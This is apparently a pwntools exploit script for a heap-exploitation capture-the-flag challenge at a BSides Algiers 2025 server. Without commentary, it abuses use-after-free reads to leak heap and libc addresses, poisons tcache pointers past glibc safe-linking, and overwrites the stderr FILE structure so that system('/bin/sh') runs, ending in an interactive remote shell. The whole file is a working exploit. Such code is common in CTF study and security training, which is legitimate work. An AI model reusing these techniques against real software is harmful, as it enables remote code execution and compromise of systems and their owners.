#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def alloc(idx, size):
    io.sendline(b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(size).encode())

def free(idx):
    io.sendline(b'2')
    io.sendlineafter(b':', str(idx).encode())

def edit(idx, data=b'A'*8):
    io.sendline(b'3')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', data)

def peak(idx, offset=0):
    io.sendline(b'4')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(offset >> 3).encode())

io = remote("pwn.ctf-bsides-algiers-2k25.shellmates.club", 1408, ssl=True)

for i in range(2): alloc(i, 0x100)
free(0) ; free(1)

peak(0)
io.recvuntil(b'go: ')
heap_base = u64(io.recvuntil(b'.')[:-2].ljust(8, b'\x00')) << 12

edit(1, p64((heap_base + 0x480) ^ (heap_base >> 12)))
for i in range(2, 4): alloc(i, 0x100)

edit(0, b'AAAA'*0x02)
edit(3, b'\x00'*0x10)

free(0) ; free(1)
edit(1, p64((heap_base + 0x360) ^ (heap_base >> 12)))
for i in range(4, 6): alloc(i, 0x100)

peak(5, 0x18)
io.recvuntil(b'go: ')
libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x202030

edit(0, b'AAAA'*0x02)

free(0) ; free(1)
edit(1, p64((libc.sym._IO_2_1_stderr_ - 0x10) ^ (heap_base >> 12)))

for i in range(6, 8): alloc(i, 0x100)

fs  = b"/bin/sh\x00".ljust(8, b'\x00') + p64(0x0)*2
fs += p64(libc.sym.system)
fs  = fs.ljust(0x88, b"\x00") + p64(heap_base+0x690)
fs  = fs.ljust(0xa0, b"\x00") + p64(libc.sym._IO_2_1_stderr_-0x20)
fs  = fs.ljust(0xc0, b"\x00") + p64(libc.sym._IO_2_1_stderr_)
fs  = fs.ljust(0xd8, b"\x00") + p64((libc.sym._IO_wfile_jumps+0x48)-0x18)

edit(7, b'\x00'*0x10 + fs)
io.send(b'4')

io.interactive()

